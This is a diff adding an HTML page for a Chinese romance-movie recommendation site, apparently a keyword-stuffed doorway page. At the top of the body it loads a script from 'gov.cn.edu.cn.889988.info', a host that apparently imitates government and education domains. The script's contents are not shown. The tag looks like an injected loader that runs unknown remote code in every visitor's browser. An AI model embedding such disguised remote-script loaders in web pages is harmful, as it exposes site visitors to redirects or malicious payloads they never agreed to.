@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>aqdy爱情电影网 - 浪漫爱情电影在线观看</title>
+<meta name="description" content="aqdy爱情电影网专注浪漫爱情电影推荐，包含甜蜜、虐恋、青春、都市等各类爱情影片，移动端自适应，陪你感受每一份心动。" />
+<meta name="keywords" content="aqdy爱情电影网,aqdyaiqingdianyingwang-h5,爱情电影,浪漫影片,在线观看" />
+<meta name="author" content="aqdy爱情电影网" />
+<meta name="robots" content="index,follow" />
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", -apple-system, sans-serif;
+  background: linear-gradient(180deg, #fce4ec 0%, #f8bbd0 50%, #e1bee7 100%);
+  color: #4a2c40;
+  line-height: 1.7;
+  min-height: 100vh;
+}
+
+a { color: #e91e8c; text-decoration: none; transition: all .3s; }
+a:hover { color: #ad1457; }
+
+/* 导航 */
+header {
+  background: rgba(255,255,255,.85);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(233,30,140,.15);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.nav-inner {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 14px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.logo {
+  font-size: 22px;
+  font-weight: 800;
+  background: linear-gradient(135deg, #e91e8c, #b388ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+nav ul {
+  display: flex;
+  gap: 22px;
+  list-style: none;
+}
+nav a {
+  font-size: 15px;
+  color: #7b4b6b;
+  font-weight: 500;
+}
+nav a:hover { color: #e91e8c; }
+
+/* Hero */
+.hero {
+  text-align: center;
+  padding: 60px 20px 50px;
+}
+.hero h1 {
+  font-family: "Georgia", cursive, serif;
+  font-size: 42px;
+  background: linear-gradient(135deg, #e91e8c, #b388ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 14px;
+}
+.hero p {
+  font-size: 17px;
+  color: #7b4b6b;
+  max-width: 500px;
+  margin: 0 auto 8px;
+}
+.hero .site-url {
+  font-size: 14px;
+  color: #e91e8c;
+  margin-top: 16px;
+}
+
+/* 区块通用 */
+.container {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 36px 20px;
+}
+.section-title {
+  text-align: center;
+  font-size: 26px;
+  color: #ad1457;
+  margin-bottom: 28px;
+  position: relative;
+}
+.section-title::after {
+  content: "♥";
+  display: block;
+  font-size: 18px;
+  color: #e91e8c;
+  margin-top: 4px;
+}
+
+/* 甜蜜推荐 - 卡片网格 */
+.sweet-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+  gap: 20px;
+}
+.sweet-card {
+  background: rgba(255,255,255,.9);
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 4px 20px rgba(233,30,140,.1);
+  transition: transform .3s, box-shadow .3s;
+}
+.sweet-card:hover {
+  transform: translateY(-6px);
+  box-shadow: 0 8px 30px rgba(233,30,140,.2);
+}
+.card-cover {
+  height: 180px;
+  background: linear-gradient(135deg, #f8bbd0, #e1bee7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 48px;
+  position: relative;
+}
+.card-cover .heart-badge {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  width: 32px;
+  height: 32px;
+  background: #e91e8c;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+}
+.card-body { padding: 16px; }
+.card-body h3 { font-size: 16px; color: #ad1457; margin-bottom: 6px; }
+.card-body p { font-size: 13px; color: #7b4b6b; }
+
+/* 爱情分类 - 圆形放射 */
+.genre-circle-grid {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 24px;
+}
+.genre-circle {
+  width: 110px;
+  height: 110px;
+  border-radius: 50%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
+  transition: transform .3s, box-shadow .3s;
+  box-shadow: 0 4px 15px rgba(0,0,0,.15);
+}
+.genre-circle:hover {
+  transform: scale(1.1);
+  animation: pulse 1s infinite;
+}
+.genre-circle span { font-size: 24px; margin-bottom: 4px; }
+.genre-circle small { font-size: 12px; }
+@keyframes pulse {
+  0%, 100% { box-shadow: 0 4px 15px rgba(233,30,140,.3); }
+  50% { box-shadow: 0 4px 25px rgba(233,30,140,.5); }
+}
+
+/* 心动排行榜 - 心形进度条 */
+.heart-rank {
+  max-width: 600px;
+  margin: 0 auto;
+}
+.rank-row {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 18px;
+  background: rgba(255,255,255,.8);
+  padding: 14px 18px;
+  border-radius: 16px;
+}
+.rank-num {
+  font-size: 22px;
+  font-weight: 800;
+  color: #e91e8c;
+  min-width: 30px;
+}
+.rank-info { flex: 1; }
+.rank-info .rank-name { font-weight: 600; color: #ad1457; margin-bottom: 4px; }
+.rank-bar {
+  height: 10px;
+  background: #fce4ec;
+  border-radius: 5px;
+  overflow: hidden;
+}
+.rank-fill {
+  height: 100%;
+  border-radius: 5px;
+  transition: width 1.5s ease;
+}
+.rank-heart { font-size: 20px; animation: beat 1s infinite; }
+@keyframes beat {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.2); }
+}
+
+/* 爱情物语 - 引用块 */
+.quotes {
+  max-width: 700px;
+  margin: 0 auto;
+}
+.quote-item {
+  background: rgba(255,255,255,.85);
+  border-left: 4px solid #e91e8c;
+  border-radius: 0 16px 16px 0;
+  padding: 20px 24px;
+  margin-bottom: 18px;
+  position: relative;
+}
+.quote-item::before {
+  content: "\201C";
+  font-size: 48px;
+  color: #f8bbd0;
+  position: absolute;
+  top: -4px;
+  left: 12px;
+  font-family: Georgia, serif;
+}
+.quote-item p { font-style: italic; color: #4a2c40; margin-bottom: 8px; padding-left: 20px; }
+.quote-item cite { font-size: 13px; color: #e91e8c; padding-left: 20px; }
+
+/* 关于我们 */
+.about-center {
+  text-align: center;
+  max-width: 600px;
+  margin: 0 auto;
+  background: rgba(255,255,255,.9);
+  border-radius: 24px;
+  padding: 36px 28px;
+}
+.about-center p { color: #7b4b6b; margin-bottom: 20px; }
+.stats-row {
+  display: flex;
+  justify-content: center;
+  gap: 40px;
+  margin-top: 24px;
+}
+.stat-item .stat-num {
+  font-size: 32px;
+  font-weight: 800;
+  background: linear-gradient(135deg, #e91e8c, #b388ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.stat-item .stat-label { font-size: 13px; color: #7b4b6b; }
+
+/* 底部 */
+footer {
+  text-align: center;
+  padding: 24px;
+  font-size: 13px;
+  color: #7b4b6b;
+  border-top: 1px solid rgba(233,30,140,.15);
+  margin-top: 40px;
+}
+
+@media (max-width: 768px) {
+  nav ul { display: none; }
+  .hero h1 { font-size: 32px; }
+  .sweet-grid { grid-template-columns: repeat(2, 1fr); }
+  .genre-circle-grid { gap: 16px; }
+  .genre-circle { width: 90px; height: 90px; }
+  .stats-row { gap: 24px; }
+}
+@media (max-width: 480px) {
+  .hero h1 { font-size: 28px; }
+  .sweet-grid { grid-template-columns: 1fr; }
+  .genre-circle { width: 80px; height: 80px; }
+  .stats-row { flex-direction: column; gap: 16px; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header>
+  <div class="nav-inner">
+    <div class="logo">aqdy爱情电影网</div>
+    <nav>
+      <ul>
+        <li><a href="#">首页</a></li>
+        <li><a href="#sweet">甜蜜推荐</a></li>
+        <li><a href="#genre">爱情分类</a></li>
+        <li><a href="#rank">心动排行</a></li>
+        <li><a href="#quotes">爱情物语</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <h1>aqdy爱情电影网</h1>
+  <p>每一帧都是心动，每一部都是深情</p>
+  <p>浪漫爱情电影 · 在线观看 · 移动端畅享</p>
+  <div class="site-url">https://aqdyaiqingdianyingwang-h5.github.io</div>
+</section>
+
+<main>
+
+  <section class="container" id="sweet">
+    <h2 class="section-title">甜蜜推荐</h2>
+    <div class="sweet-grid">
+      <article class="sweet-card">
+        <div class="card-cover">💕<div class="heart-badge">♥</div></div>
+        <div class="card-body">
+          <h3>初恋那件小事</h3>
+          <p>青春暗恋，甜到心里</p>
+        </div>
+      </article>
+      <article class="sweet-card">
+        <div class="card-cover">🌹<div class="heart-badge">♥</div></div>
+        <div class="card-body">
+          <h3>怦然心动</h3>
+          <p>梧桐树下的纯真爱恋</p>
+        </div>
+      </article>
+      <article class="sweet-card">
+        <div class="card-cover">🎠<div class="heart-badge">♥</div></div>
+        <div class="card-body">
+          <h3>恋恋笔记本</h3>
+          <p>一生只爱一个人的承诺</p>
+        </div>
+      </article>
+      <article class="sweet-card">
+        <div class="card-cover">✨<div class="heart-badge">♥</div></div>
+        <div class="card-body">
+          <h3>你的名字</h3>
+          <p>跨越时空的宿命之恋</p>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section class="container" id="genre">
+    <h2 class="section-title">爱情分类</h2>
+    <div class="genre-circle-grid">
+      <div class="genre-circle" style="background:linear-gradient(135deg,#e91e8c,#f06292);"><span>🍬</span><small>甜蜜</small></div>
+      <div class="genre-circle" style="background:linear-gradient(135deg,#9c27b0,#ce93d8);"><span>💔</span><small>虐恋</small></div>
+      <div class="genre-circle" style="background:linear-gradient(135deg,#e91e63,#f48fb1);"><span>🌸</span><small>青春</small></div>
+      <div class="genre-circle" style="background:linear-gradient(135deg,#ad1457,#f06292);"><span>🏙️</span><small>都市</small></div>
+      <div class="genre-circle" style="background:linear-gradient(135deg,#6a1b9a,#ba68c8);"><span>🏰</span><small>古装</small></div>
+      <div class="genre-circle" style="background:linear-gradient(135deg,#c2185b,#f8bbd0);"><span>💍</span><small>婚姻</small></div>
+    </div>
+  </section>
+
+  <section class="container" id="rank">
+    <h2 class="section-title">心动排行榜</h2>
+    <div class="heart-rank">
+      <div class="rank-row">
+        <div class="rank-num">1</div>
+        <div class="rank-info">
+          <div class="rank-name">泰坦尼克号</div>
+          <div class="rank-bar"><div class="rank-fill" style="width:98%;background:linear-gradient(90deg,#e91e8c,#b388ff);"></div></div>
+        </div>
+        <div class="rank-heart">♥</div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-num">2</div>
+        <div class="rank-info">
+          <div class="rank-name">罗马假日</div>
+          <div class="rank-bar"><div class="rank-fill" style="width:94%;background:linear-gradient(90deg,#e91e8c,#b388ff);"></div></div>
+        </div>
+        <div class="rank-heart">♥</div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-num">3</div>
+        <div class="rank-info">
+          <div class="rank-name">乱世佳人</div>
+          <div class="rank-bar"><div class="rank-fill" style="width:90%;background:linear-gradient(90deg,#e91e8c,#b388ff);"></div></div>
+        </div>
+        <div class="rank-heart">♥</div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-num">4</div>
+        <div class="rank-info">
+          <div class="rank-name">花样年华</div>
+          <div class="rank-bar"><div class="rank-fill" style="width:87%;background:linear-gradient(90deg,#e91e8c,#b388ff);"></div></div>
+        </div>
+        <div class="rank-heart">♥</div>
+      </div>
+      <div class="rank-row">
+        <div class="rank-num">5</div>
+        <div class="rank-info">
+          <div class="rank-name">爱在黎明破晓前</div>
+          <div class="rank-bar"><div class="rank-fill" style="width:84%;background:linear-gradient(90deg,#e91e8c,#b388ff);"></div></div>
+        </div>
+        <div class="rank-heart">♥</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="container" id="quotes">
+    <h2 class="section-title">爱情物语</h2>
+    <div class="quotes">
+      <div class="quote-item">
+        <p>你跳，我也跳。</p>
+        <cite>— 《泰坦尼克号》</cite>
+      </div>
+      <div class="quote-item">
+        <p>有些人浅薄，有些人金玉其外败絮其中。有一天你会遇到一个彩虹般绚丽的人，从此以后，其他人不过是匆匆浮云。</p>
+        <cite>— 《怦然心动》</cite>
+      </div>
+      <div class="quote-item">
+        <p>如果我有千千万万颗心，我愿用全部去爱你。</p>
+        <cite>— 《简·爱》</cite>
+      </div>
+    </div>
+  </section>
+
+  <section class="container" id="about">
+    <h2 class="section-title">关于我们</h2>
+    <div class="about-center">
+      <p><strong>aqdy爱情电影网</strong> 是一个专注于爱情电影推荐的单页网站，为你精选全球浪漫佳作，陪你感受每一份心动与深情。</p>
+      <p>官网：<a href="https://aqdyaiqingdianyingwang-h5.github.io">https://aqdyaiqingdianyingwang-h5.github.io</a></p>
+      <div class="stats-row">
+        <div class="stat-item"><div class="stat-num">5000+</div><div class="stat-label">爱情影片</div></div>
+        <div class="stat-item"><div class="stat-num">50万+</div><div class="stat-label">心动用户</div></div>
+        <div class="stat-item"><div class="stat-num">24h</div><div class="stat-label">随时畅看</div></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  © 2026 aqdy爱情电影网 | 网站名称：aqdy爱情电影网
+</footer>
+
+</body>
+</html>
